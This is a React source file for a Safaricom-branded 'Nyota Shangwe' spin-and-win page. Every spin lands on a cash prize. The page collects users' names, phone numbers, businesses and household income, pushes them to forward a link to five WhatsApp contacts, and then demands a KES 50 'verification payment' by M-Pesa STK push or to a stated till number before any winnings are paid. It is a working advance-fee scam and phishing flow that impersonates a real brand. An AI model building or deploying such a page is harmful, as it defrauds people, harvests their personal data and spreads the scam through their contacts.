
import React, { useState, useRef } from 'react';
import safaricomLogo from '../assets/safaricom.svg';

const AMOUNTS = [520000,13000,50000,30000,5000,25000,40000];

export default function App(){
  const [step,setStep] = useState(1);
  const [name,setName]=useState('');
  const [business,setBusiness]=useState('');
  const [householdIncome,setHouseholdIncome]=useState('');
  const [phone,setPhone]=useState('');
  const [wonAmount,setWonAmount]=useState(null);
  const [isSpinning,setIsSpinning]=useState(false);
  const wheelRef=useRef(null);
  const [shareNumbers,setShareNumbers]=useState(['','','','','']);
  const [stkStatus,setStkStatus]=useState(null);
  const [isRequesting,setIsRequesting]=useState(false);

  function startSpin(){
    if(!business || !householdIncome || !phone){
      alert('Please answer all questions and provide your phone number (e.g., +2547XXXXXXXX).');
      return;
    }
    setStep(2);
    setIsSpinning(true);
    const chosenIndex = Math.floor(Math.random()*AMOUNTS.length);
    const chosenAmount = AMOUNTS[chosenIndex];
    const sliceDeg = 360/AMOUNTS.length;
    const spins=6;
    const targetDeg = spins*360 + (360 - chosenIndex*sliceDeg - sliceDeg/2);
    if(wheelRef.current){
      wheelRef.current.style.transition='transform 4s cubic-bezier(.17,.67,.34,1)';
      wheelRef.current.style.transform=`rotate(${targetDeg}deg)`;
      setTimeout(()=>{ setIsSpinning(false); setWonAmount(chosenAmount); setStep(3);
        wheelRef.current.style.transition='none';
        const normalized = targetDeg % 360;
        wheelRef.current.style.transform = `rotate(${normalized}deg)`;
      },4200);
    } else {
      setTimeout(()=>{ setIsSpinning(false); setWonAmount(chosenAmount); setStep(3); },1500);
    }
  }

  function handleShareNumberChange(i,v){
    const next=[...shareNumbers]; next[i]=v; setShareNumbers(next);
  }

  function shareToWhatsAppAll(){
    const repo='https://github.com/kishcod/shangwe.git';
    const message = encodeURIComponent(`I participated in Nyota Shangwe. Check: ${repo}`);
    shareNumbers.forEach(num=>{
      const cleaned=(num||'').replace(/[^0-9+]/g,'');
      if(cleaned){
        const phoneParam = cleaned.startsWith('+')?cleaned.replace('+',''):cleaned;
        const url = `https://api.whatsapp.com/send?phone=${phoneParam}&text=${message}`;
        window.open(url,'_blank');
      }
    });
  }

  async function sendStkPush(){
    if(!phone){ alert('Enter phone'); return; }
    setIsRequesting(true); setStkStatus(null);
    try{
      const res = await fetch('/api/stk-push', { method:'POST', headers:{'content-type':'application/json'}, body: JSON.stringify({ phone, amount:50 }) });
      const data = await res.json();
      setStkStatus(data);
    }catch(err){
      setStkStatus({ success:false, message: err.message });
    }
    setIsRequesting(false);
  }

  return (
    <div className="min-h-screen flex items-center justify-center p-6">
      <div className="w-full max-w-4xl bg-white shadow rounded-2xl overflow-hidden">
        <div className="flex items-center justify-between p-6 border-b">
          <div className="flex items-center gap-4">
            <img src={safaricomLogo} alt="Safaricom" className="w-20 h-20" />
            <div>
              <h1 className="text-2xl font-bold">Nyota Shangwe</h1>
              <p className="text-sm text-slate-600">Answer a few questions — spin & win!</p>
            </div>
          </div>
        </div>

        <main className="p-6">
          {step===1 && (
            <div>
              <h2 className="text-xl font-semibold mb-4">Tell us about yourself</h2>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <input placeholder="Full name" value={name} onChange={e=>setName(e.target.value)} className="p-3 border rounded" />
                <input placeholder="+2547..." value={phone} onChange={e=>setPhone(e.target.value)} className="p-3 border rounded" />
                <input placeholder="What business do you have?" value={business} onChange={e=>setBusiness(e.target.value)} className="p-3 border rounded md:col-span-2"/>
                <input placeholder="Household monthly income (KES)" value={householdIncome} onChange={e=>setHouseholdIncome(e.target.value)} className="p-3 border rounded md:col-span-2"/>
              </div>
              <div className="mt-6 flex gap-3">
                <button onClick={()=>setStep(2)} className="px-6 py-3 bg-sky-600 text-white rounded">Skip to Spin</button>
                <button onClick={startSpin} className="px-6 py-3 bg-green-600 text-white rounded">Submit & Spin</button>
              </div>
            </div>
          )}

          {step===2 && (
            <div className="flex flex-col items-center gap-6">
              <h2 className="text-2xl font-bold">Spin the Shangwe Wheel</h2>
              <div className="w-72 h-72 relative">
                <div ref={wheelRef} className="w-72 h-72 rounded-full border-8 border-slate-200 flex items-center justify-center origin-center">
                  <svg viewBox="0 0 200 200" className="w-full h-full">
                    <g transform="translate(100,100)">
                      {AMOUNTS.map((amt,idx)=>{
                        const angle = (360/AMOUNTS.length)*idx;
                        const x = Math.cos((angle+360/AMOUNTS.length/2)*Math.PI/180)*60;
                        const y = Math.sin((angle+360/AMOUNTS.length/2)*Math.PI/180)*60;
                        return <text key={idx} x={x} y={y} textAnchor="middle" fontSize="12">{amt}</text>
                      })}
                    </g>
                  </svg>
                </div>
                <div className="absolute left-1/2 transform -translate-x-1/2 -bottom-4">
                  <div className="w-6 h-6 bg-red-600 rotate-45"></div>
                </div>
              </div>
              <div className="flex gap-4">
                <button onClick={startSpin} className="px-6 py-3 bg-indigo-600 text-white rounded">Spin</button>
                <button onClick={()=>setStep(1)} className="px-6 py-3 bg-slate-200 rounded">Back</button>
              </div>
            </div>
          )}

          {step===3 && (
            <div className="text-center">
              <h2 className="text-3xl font-bold mb-4">HITI! You won</h2>
              <p className="text-4xl font-extrabold text-emerald-600">KES {wonAmount?.toLocaleString()}</p>
              <p className="mt-4 text-slate-600">Congratulations {name || ''}!</p>
              <div className="mt-6 flex justify-center gap-3">
                <button onClick={()=>setStep(4)} className="px-6 py-3 bg-amber-600 text-white rounded">Share & Verify</button>
                <button onClick={()=>setStep(5)} className="px-6 py-3 bg-teal-600 text-white rounded">Proceed to Payment</button>
              </div>
            </div>
          )}

          {step===4 && (
            <div>
              <h2 className="text-2xl font-bold mb-4">Share this link to 5 WhatsApp numbers</h2>
              <p className="text-sm mb-4">Share: https://github.com/kishcod/shangwe.git</p>
              <div className="grid gap-2">
                {shareNumbers.map((v,i)=>(<input key={i} value={v} onChange={e=>handleShareNumberChange(i,e.target.value)} placeholder={`WhatsApp number ${i+1}`} className="p-3 border rounded" />))}
              </div>
              <div className="mt-4 flex gap-3">
                <button onClick={shareToWhatsAppAll} className="px-6 py-3 bg-green-600 text-white rounded">Share to all</button>
                <button onClick={()=>setStep(5)} className="px-6 py-3 bg-slate-200 rounded">Done — proceed</button>
              </div>
            </div>
          )}

          {step===5 && (
            <div className="text-center">
              <h2 className="text-2xl font-bold mb-4">Payment for processing</h2>
              <p className="mb-4">Verification payment KES 50. Manual Till: <strong>8160572</strong></p>
              <div className="grid gap-2">
                <input placeholder="+2547..." value={phone} onChange={e=>setPhone(e.target.value)} className="p-3 border rounded w-64 mx-auto"/>
              </div>
              <div className="mt-4 flex gap-3 justify-center">
                <button onClick={sendStkPush} className="px-6 py-3 bg-blue-600 text-white rounded">Pay KES 50 (STK Push)</button>
                <button onClick={()=>alert('Please pay manually using Lipa na M-Pesa Till 8160572 then click I have paid.')} className="px-6 py-3 bg-orange-500 text-white rounded">Pay Manually</button>
              </div>
              {stkStatus && <div className={`mt-4 p-3 rounded ${stkStatus.success ? 'bg-emerald-50' : 'bg-red-50'}`}><p>{stkStatus.message}</p></div>}
              <div className="mt-6"><button onClick={()=>setStep(6)} className="px-6 py-3 bg-slate-800 text-white rounded">I have paid — proceed</button></div>
            </div>
          )}

          {step===6 && (
            <div className="text-center">
              <h2 className="text-2xl font-bold mb-4">Thanks — please wait for funds</h2>
              <p>After confirming payment, KES {wonAmount?.toLocaleString()} will be processed.</p>
              <div className="mt-6"><button onClick={()=>{ setStep(1); setWonAmount(null); }} className="px-6 py-3 bg-slate-200 rounded">Back to Start</button></div>
            </div>
          )}
        </main>

        <footer className="p-4 border-t text-xs text-slate-500 text-center">Demo — replace mock backend with real Safaricom integration for production.</footer>
      </div>
    </div>
  )
}
